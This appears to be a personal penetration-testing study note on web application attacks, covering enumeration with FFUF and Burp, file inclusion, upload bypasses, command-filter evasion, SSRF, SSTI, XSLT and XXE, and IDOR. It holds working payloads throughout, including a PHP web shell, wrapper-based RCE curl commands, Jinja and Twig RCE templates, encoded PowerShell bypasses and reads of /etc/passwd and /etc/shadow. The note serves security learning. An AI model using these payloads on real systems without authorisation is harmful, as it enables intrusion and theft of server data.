Navigation: [[Pentesting]]

---
# Table of Contents
1. Methodology
2. File Inclusion
3. File Upload
4. Injection Attacks
	1. XSS
	2. SQLi
	3. Filter Bypasses
5. Server Side Attacks
	1. Server Side Request Forgery
	2. Server Side Template Injection
	3. Server Side Includes Injection
	4. XSLT Injection
6. Attacking HTTP Headers
	1. HTTP Verb Tampering
7. Structured Object Attacks
	1. XXE Injection
8. Other Attacks
	1. IDOR Attacks
9. List of Web API Attacks

Useful Stuff:
[HackTricks](https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology)
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
[OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/)
[FFUF](https://github.com/ffuf/ffuf)
[BurpSuite Docs](https://portswigger.net/burp/documentation)
# Methodology
The first step to attacking a web app is to footprint the entire app. Here's a simple checklist to follow (taken from OWASP WSTG):
1. [Fingerprint the web server](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server)
2. [View metadata of server](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage) 
3. [Fingerprint Web App](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework)
	1. Find all available pages, directories (subdirectories if needed), and extensions
	2. Identify framework
	3. View HTML code
	4. Search for input/upload fields

Once we can identify what the web app offers, here's the attacks we can perform based off of what we have:

| Surface                    | Attack Vectors              |
| -------------------------- | --------------------------- |
| Directories/Subdirectories | File inclusion, file upload |
| Input fields               | Various injection attacks   |
| Internal requests          | SSRF                        |
| XML                        | XXE and XSLT Injections     |
| Cross domain requests      | CSRF, IDOR References       |
# Tools of the Trade
# FFUF
Web enumeration using [FFUF](https://github.com/ffuf/ffuf) is very simple. Here's the syntax:
```shell
ffuf -w <wordlist>:<key word> -u <host>/<key word>
```

FFUF will replace the key word we set with words from the word list.

Here's some quick ways to fuzz a few things:
```shell
# Directories
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ

# Extensions
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ

# Pages
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ.php

# Recursion
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v

```
Useful [wordlists](https://github.com/danielmiessler/SecLists)
```shell
/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
/SecLists/Discovery/Web-Content/web-extensions.txt
/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```
# BurpSuite
[BurpSuite](https://portswigger.net/burp) is a web proxy that we'll be using a lot. It can do a whole lot of things, such as intercepting and modifying web requests, sending different requests, etc.

To change a request in burp, send right click and send to repeater. From here, we can manually change things about the request if we need to:
![[burp_repeater_request.jpg]]

If we need to change the encoding on any text, we can simply right click it and go to `Convert Selection>URL>URL encode key characters`. We can also just do `CTRL+U` after selecting the text.

To send a predefined set of payloads in a field (or multiple fields), send the request to [burp intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack). 

When configuring our payloads, we have several options. We can view payload options in the [docs](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/payload-types)
# File Inclusion
### Introduction
Lots of backend languages use HTTP parameters to specify what's being shown on the page. This allows for building more dynamic pages, reduces script sizes, and simplifies code.

However, these parameters need to be filtered properly, otherwise they can lead to file inclusion vulnerabilities. This allows an attacker to read or execute files on the server by bypassing filters.

There are two types of file inclusion: local and remote. These names are specified by where the files are contained: local being on the server, and remote being remotely referenced scripts.
### Local File Inclusion
Let's start with an example. Take a look at this URI:
```http
http://<IP>:<PORT>/index.php?lang=es.php
```
From what we can see, we're loading the page `es.php` from our server. If there were no filters, we can change `es.php` to `/etc/shadow` and display that. We're also free to traverse paths if it isn't blocked by the filter.
##### Common Filters
**Filename Prefix**
The PHP code would look like this:
```php
include("lang_" . $_GET['language']);
```
Meaning we'd be accessing:
```http
/lang_esp.php
```
Regardless, we'll just include this as a prefix:
```http
/lang_/etc/password
```
**Non-Recursive Path Traversal**
Code:
```PHP
$language = str_replace('../', '', $_GET['language']);
```
Exploit:
```shell
....//
# Server recognizes this as ../
```
**Special Character Filter**
Some web filters remove special characters. We can bypass this using URL encoding.

**Appended Extension**
Some filters require an extension at the end of our files, such as `.php`. There are two bypasses for this:

Path truncation, where we can just extend our path beyond the maximum checked length. Older versions of PHP have a 4096 character path limit, so we can simply have:
```shell
/etc/passwd/././././././././././... # Repeated to 4096 chars
```
With null byte injection, PHP would terminate a string after a null byte. Therefore our payload can look like:
```shell
/etc/passd%00.php
```
### Finding RCE in PHP Apps
We can check the PHP config file found at `/etc/php/X.Y/apache2/php.ini`. Search for a `base64` string and decode it, this contains our configs. 

We'll need `allow_url_include = On` to be enabled for RCE through the data and input wrappers. The expect wrapper relies on `extension=expect` to be set.

**Data Wrapper**
Used to allow external data including PHP code. It can also be passed `base64` code with `text/plain'base64`, and can decode then execute the PHP code. 

Here's a simple way we can send a payload:
```http
data://text/plain;base64, <PHP webshell> &cmd<cmd>
```

Here's the web shell used:
```shell
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

**Input Wrapper**
Similar to the data wrapper, just we POST the data:
```shell
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

**Include Wrapper**
Allows commands to directly be run through URL streams. It's an external wrapper, so it needs to be manually installed and enabled. 

Example usage:
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
### Remote File Inclusion
With RFI, we're essentially just going to host a file server and have the web server grab a file off of us. Nothing else to really include here. You might have to play around with the protocol though.
# File Upload
### Introduction
File upload attacks involve uploading a file that the user shouldn't be able to. From here, they're able to run that file through accessing it on the web server, often resulting in RCE. If we don't get RCE, we can introduce vulnerabilities such as `XSS` or `XXE`, cause `DoS`, or overwrite system configuration files.

This vulnerability is caused by improper filtering and validation of uploaded files. It can also be caused by the use of outdated libraries. It's rated as `high` or `critical` in most vulnerability reports.

The most basic version of this vulnerability is arbitrary file upload, where there's no validation filters on uploaded files. We can either upload a web shell or reverse shell, then access that file. 

Note that when sending a web shell, we'll need to use Burp Intruder to fuzz for it using a [word list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt), or sometimes we might just be able to see it without fuzzing. We'll need to use the correct type of extension for our web app.
### Client Side Validation
Many web apps rely on front end JavaScript to validate files. This can easily be bypassed through just direct interaction with the server, skipping front end validation.

This essentially allows us arbitrary upload if the back end doesn't validate. When checking the request through burp, we can see that the front end validations remove anything that shouldn't be in the request. However, we can simply modify the request as it's being sent

We can also just remove or modify any client side validation we find using developer tools if we don't want to use burp.
### Server Side Validation
##### Extension Filters
The first step in working against any filter is to find a list of allowed extensions. Not all extensions work with all web server configurations. `PayloadAllTheThings` has lists for [`PHP`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [`.NET`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) extensions. There's also a [list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) of common web extensions.

When we make a file upload request using burp, simply send the request to intruder, select sniper, then configure our request as such:
![[file_uploads_burp_fuzz_extension.jpg]]

From here, simply just load in the extensions in the payload options and uncheck the URL encoding option. We can then sort our results to see what's been successful.

There are two types of filters: blacklist and whitelist.

With blacklist filters, we'll often find specific file types be excluded. This may also include file content sometimes. The weakest type of validation is testing the file extension against a blacklist.

An example bit of PHP code that does so is the following:
```PHP
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```
Note that the comparison above is case sensitive. In Windows Servers, a good thing to note is that file names are case insensitive.

Whitelist filters have a list of approved file extensions. An example would be:
```PHP
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
A very straightforward way to bypass the above extension is simply by using double extensions. For the above example. `*.jpg.php` would bypass this filter.

This might not always work, especially if a regex like the following is used:
```PHP
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName))
```
With some server configurations, we can also use a reverse double extension. The XML configuration for the following would look like:
```XML
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

The above extension allows anything with `.php` in the name to be run as a PHP file.

The last thing we can try against whitelist filters is character injection. For example, `shell.php%00.jpg` would work with PHP 5.X or below due to their null termination bug.

Here's a simple script we can use to generate a word list:
```shell
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
##### Type Filters
These filters are usually regarding content type headers or file content itself. 

If we think we're being limited by content type, we can use a [Content Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt) to find which types are allowed. Fuzz for this the similarly to the above using burp.

The more common type of filter is file content. The content is validated by checking the file's MIME type. This is often done by checking [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures). We can simply bypass this by appending the correct magic bytes to the file header.
### Limited Upload Attacks
Sometimes, we won't always be able to upload a web shell or reverse shell. In times like these, we can refer to the below table to see the type of attack available to us based on file type:

| Attack   | File Types                  |
| -------- | --------------------------- |
| XSS      | HTML, JS, SVG, and GIF      |
| XXE/SSRF | XML, SVG, PDF, PPT, and DOC |
| DoS      | ZIP, JPG, PNG               |
# Injection Attacks
Injection attacks involve input fields improperly parsing or sanitizing input prior to use. This can lead to several different attacks, all of which are considered critical or severe.
### XSS
Cross Site Scripting is an attack where we inject HTML code (that would often contain a script tag) into a site.

Types of XSS:

| Type      | Description                                                                                                                               |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| Stored    | User input stored on backend, displayed upon retrieval.                                                                                   |
| Reflected | User input displayed on page after being processed by backend, but without being stored (search result or error message).                 |
| DOM       | User input is directly show in the browser and reflected on client side without reading backend (through HTTP parameters or anchor tags). |

[HackTricks Link](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
### SQLi
SQLi involves injecting SQL code into a field, controlling the query made to the database. For a refresher on SQL syntax, visit this [cheatsheet](https://devhints.io/mysql).

For a list of payloads and methodologies, view:
[`HackTricks Link`](https://book.hacktricks.xyz/pentesting-web/sql-injection)
[`Payload All The Things`](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#tools)
### Filter Bypasses
##### Blacklisted Characters
To identify blacklisted characters, we can send a request containing each character one by one on burp. Whatever returns an invalid input has been filtered.

Spaces are often one of the most filtered characters. Here's some things we can use to try and bypass it:
```shell
%09 # tabs instead of spaces
${IFS} # Linux env var for space
{ls, -la} # brace expansion
```
[`PayloadAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) has a repository full of character bypasses.
##### Blacklisted Commands
To bypass blacklisted commands, we can use:
- Character insertion: `'' or ""`, `\` on Bash, or `^` on Windows CMD only. These will be ignored by the system
- Case manipulation
- Reversed commands: `iex "$('imaohw'[-1..-20] -join '')"` or `$(rev<<<'imaohw')`
- Encoded commands: `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
##### Command Obfuscation
[Windows Command Obfuscator](https://github.com/danielbohannon/Invoke-DOSfuscation)
[Linux Command Obfuscator](https://github.com/Bashfuscator/Bashfuscator)
# Server Side Attacks
### SSRF
SSRF Is a vulnerability where attackers can manipulate a web app into sending unauthorized requests from the server. This usually happens when an app makes HTTP requests to other servers based on user input.

The following URI schemes are commonly used in SSRF:
- `HTTP/S` used to fetch content from other endpoints. The main use case for this is to bypass WAFs or access restricted endpoints.
- `file://` reads a file from the local system, can be used for local file inclusion.
- `gopher://` which is used to send arbitrary bytes to a specified address.

**Enumeration**
When observing requests through Burp, we might notice something like the following:
![[ssrf_identify_2.webp]]

We can see a secondary request being made here. To confirm if we can control this request, try changing the request to our own IP and start a netcat listener. If the netcat listener gets a request, we've confirmed that SSRF exists.

Beyond this, if we can see the contents of the request that was made, the SSRF is not blind.

Upon confirming the vulnerability, we can now use `FFUF` to fuzz:
```shell
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```
**Exploitation**
First, we may be able to access restricted endpoints. We can fuzz the local subnet as needed. We can also do a directory brute force on the web server itself. We'll first need to find out which server is being used by accessing a non-existent page:
![[ssrf_exploit_2.webp]]

From there we can simply fuzz the local directory using [this](/opt/SecLists/Discovery/Web-Content/raft-small-words.txt) wordlist. We can also try LFI by supplying a URL such as `file:///etc/passwd` and seeing if this gets returned.

We can also use gopher to interact with internal services. Creating URIs for use with gopher can take a while, luckily there's a [tool](https://github.com/tarunkant/Gopherus) for that.

**Mitigating SSRF**
Reference the [OWASP Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
### SSTI
Web apps utilizing templates to generate responses can be vulnerable to SSTI. When an attacker can inject template code, SSTI is available. 

`PayloadAllTheThings` has a nice [guide](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) for exploiting SSTI. There's also one by [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php) that goes a bit more in depth.

A very nice tool we can use is [`SSTImap`](https://github.com/vladko312/SSTImap).

**Enumeration**
The most effective way to identify SSTI is to inject some special characters and check the behavior of the web app. A test string we can use that should work against most templates is:
```
${{<%[%'"}}%\.
```
Once we've confirmed the vulnerability exists, we should identify which template engine is being used next. Use the flowchart below:
![[Pasted image 20241130092307.png]]

Follow the red arrow if the web app errors out.

**Jinja Exploits**
```jinja2
# Information disclosure
{{ config.items() }}

# Dump built in functions
{{ self.__init__.__globals__.__builtins__ }}

# LFI
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
HackTricks made a very nice [guide](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) for Jinja specific SSTI.

**Twig Exploits**
```twig
# Information disclosure
{{ _self }}

# LFI
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# RCE 
{{ ['id'] | filter('system') }}
```
### SSI Injection
Server-Side Includes allows web apps to make dynamic content on HTML pages. It's supported by both Apache and IIS. Usually we can infer that it's being used based off of web extensions such as `.shtml`, `.shtm`, and `.stm`. Some configurations allow arbitrary file extensions to be used.

**SSI Directives**
SSI uses directives to generate content dynamically. It consists of the following components: name, parameter name, and value. It uses the following syntax:
```ssi
<!--#name param1="value1" param2="value" -->

Here's an example of config
<!--#config errmsg="Error!" -->

```

A list of payloads can be found [here](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Include%20Injection/#methodology). There's also a guide by [HackTricks](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection).

### XSLT Injection
This vulnerability involves manipulating XSLT transformations on the server. XSLT is used to transform XML documents into other formats. Here are the most common XSL elements:
- `<xsl:template>`: Introduces a template, can contain a `match` attribute that contains a path that this template applies to
- `<xsl:value-of>`: extracts value of XML node specified in `select` attribute
- `<xsl:for-each>`: enables looping over all XML nodes specified in `select` attribute

The check if this vulnerability exists, we can inject a `<` and see if this crashes the app. If this works, we can continue with some payloads:
```xml
# Information Disclosure

Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />

# LFI (XSLT v2.0)
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />

# LFI (PHP function support)
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />

# RCE
<xsl:value-of select="php:function('system','id')" />
```
# Attacking HTTP Headers
### HTTP Verb Tampering
This attack works by attacking the HTTP method used for requests. Other than `GET` and `POST`, here are the most commonly used verbs:

| Method    | Description                                                                                         |
| --------- | --------------------------------------------------------------------------------------------------- |
| `HEAD`    | Identical to a GET request, but its response only contains the `headers`, without the response body |
| `PUT`     | Writes the request payload to the specified location                                                |
| `DELETE`  | Deletes the resource at the specified location                                                      |
| `OPTIONS` | Shows different options accepted by a web server, like accepted HTTP verbs                          |
| `PATCH`   | Apply partial modifications to the resource at the specified location                               |
**Insecure Configuration**
Insecure configurations cause the first type of HTTP verb tampering vulnerabilities. When an admin doesn't take into account other methods, we can use these methods to bypass authentication.

An example of insecure configuration would be:
```xml
<Limit GET POST>
    Require valid-user
</Limit>
```
**Insecure Coding**
Insecure coding causes the other type of verb tampering vulnerability. Usually a regex is used to filter requests. We can bypass these filters to bypass authentication. Here's an example of an improper filter, where the developer forgot to filter all requests:
```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```
**Verb Tampering Attacks**
To bypass insecure configurations and coding, we can simply change the request method in burp. For example, the `HEAD` method is identical to `GET` but doesn't return a body in the HTTP response. If this request is successful, an action may be performed even if we don't get any output.
# Structure Object Attacks
### XML External Entities
XXE Injection happens when XML data is taken from user input and passed to XML without parsing. XML documents are formed of element trees, with each element being a tag, following a root/child structure.

Here are some of the key elements of an XML document:

|Key|Definition|Example|
|---|---|---|
|`Tag`|The keys of an XML document, usually wrapped with (`<`/`>`) characters.|`<date>`|
|`Entity`|XML variables, usually wrapped with (`&`/`;`) characters.|`&lt;`|
|`Element`|The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.|`<date>01-01-2022</date>`|
|`Attribute`|Optional specifications for any element that are stored in the tags, which may be used by the XML parser.|`version="1.0"`/`encoding="UTF-8"`|
|`Declaration`|Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.|`<?xml version="1.0" encoding="UTF-8"?>`|

Some characters that are part of the XML document structure, like `<`, `>`, `&`, or `"`, need to be replaced with their entity references: `&lt;`, `&gt;`, `&amp;`, `&quot;`. 

The XML Document Type Definition allows validation of documents against a pre-defined structure. Think of it like a filter for XML files.

We can also define custom entities (the equivalent of variables in XML) in XML DTDs. This can be done with the `ENTITY` key word. Once it's been defined, we can reference it as such: `&entity;`.

For a list of potential payloads, reference [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
# Other Attacks
### Insecure Direct Object Reference
One of the most common web vulnerabilities, it happens a web app exposes a direct reference to an object, such as a file or database resource. The user is able to directly control this object to access other similar items.

Since building a solid access control is challenging, IDOR vulnerabilities are everywhere. For example, if a download request is made, the user may get a link like `download.php?file_id=123`. If we change the ID, we may be able to access any file by sending a request with its ID.

Just exposing direct references to internal objects or resources isn't a vulnerability. But it makes it possible to exploit another vulnerability: weak access control systems. Many web apps restrict users from accessing pages, functions, or APIs that can retrieve these resources. If a web app didn't have an access control system on the backend to prevent access, then the user may be able to access them.

**Finding IDOR Vulnerabilities**
First, we'll need to find direct object references. These are mostly found in URL parameters or APIs but may also be found in HTTP headers or cookies. 

Sometimes, Ajax calls are able to be found in the front end code. This is insecure, however, this can be seem from time to time. These are often implemented in a way such that the appropriate functions are only active for each role. However, we can still attempt to make a cross domain request and see if it works.

Here's an example of some broken code:
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
**Enumeration**
The best way we can mass enumerate IDOR exposure is through burp intruder. OWASP ZAP is also another option we can use, although burp tends to be the most simplistic. To enumerate, find the request that's being made and iterate through other potential parameters.
# List of Web API Attacks
### API Types
APIs can be build in various styles, each with their own use case:

| Style                                                                                               | Description                                                                                                                                                                                                                                                              |
| --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [Representational State Transfer](https://ics.uci.edu/~fielding/pubs/dissertation/top.htm) (`REST`) | Most popular style, uses `client-server` model where client sends request using HTTP methods. All of the requests are stateless, with responses typically sent back in JSON or XML.                                                                                      |
| [Simple Object Access Protocol](https://www.w3.org/TR/2000/NOTE-SOAP-20000508/) (`SOAP`)            | Uses XML for message exchange. Highly standardized and offers many features for security, transactions and error handling. Much more complex to implement and use than REST APIs.                                                                                        |
| [GraphQL](https://graphql.org/)                                                                     | Alternative style that's flexible and efficient for fetching and updating data. Instead of a fixed set of fields, it allows clients to specify what data they need. This API uses a single endpoint and a strongly typed query language to retrieve data.                |
| [gRPC](https://grpc.io/)                                                                            | Newer style that uses [Protocol Buffers](https://protobuf.dev/) for message serialization, providing a high performance and efficient way to communicate between systems. Developed using a variety of languages, very useful for microservices and distributed systems. |
### OWASP Top 10 API Attacks
|**Risk**|**Description**|
|---|---|
|[API1:2023 - Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)|The API allows authenticated users to access data they are not authorized to view.|
|[API2:2023 - Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)|The authentication mechanisms of the API can be bypassed or circumvented, allowing unauthorized access.|
|[API3:2023 - Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)|The API reveals sensitive data to authorized users that they should not access or permits them to manipulate sensitive properties.|
|[API4:2023 - Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)|The API does not limit the amount of resources users can consume.|
|[API5:2023 - Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)|The API allows unauthorized users to perform authorized operations.|
|[API6:2023 - Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)|The API exposes sensitive business flows, leading to potential financial losses and other damages.|
|[API7:2023 - Server Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)|The API does not validate requests adequately, allowing attackers to send malicious requests and interact with internal resources.|
|[API8:2023 - Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)|The API suffers from security misconfigurations, including vulnerabilities that lead to Injection Attacks.|
|[API9:2023 - Improper Inventory Management](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/)|The API does not properly and securely manage version inventory.|
|[API10:2023 - Unsafe Consumption of APIs](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)|The API consumes another API unsafely, leading to potential security risks.|


---
Navigation: [[Pentesting]]